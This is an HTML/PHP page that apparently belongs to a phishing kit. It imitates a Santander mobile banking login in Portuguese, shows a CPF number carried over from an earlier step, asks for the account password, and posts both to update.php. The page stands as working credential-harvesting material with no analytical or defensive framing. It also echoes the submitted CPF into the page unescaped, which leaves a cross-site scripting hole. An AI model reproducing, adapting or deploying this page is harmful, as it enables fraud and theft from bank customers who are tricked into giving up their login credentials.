﻿<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css" />
<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="js/jquery.maskedinput.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png" />
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
<form action="update.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return checkLogin();">
 <table width="80%" class="center pt100">
  <tbody>
    <tr>
      <td><span>CPF</span></td>
    </tr>
    <tr>
      <td><input class="frm" type="text" id="cpf" name="cpf" value="<?php echo $_POST['cpf']; ?>"  readonly></td>
    </tr>
        
    <tr style="height: 20px;">
      <td></td>
    </tr>
    <tr>
      <td><span>Digite sua senha</span></td>
    </tr>
    <tr>
      <td><input class="frm" type="password" name="snet" id="snet" maxlength="8" required></td>
    </tr>
  </tbody>
    
</table>

<div class="pt30">
	<input type="submit" id="btn-entrar" value="CONTINUAR">
</div>
	
		
</form>

</div>
</body>
</html>
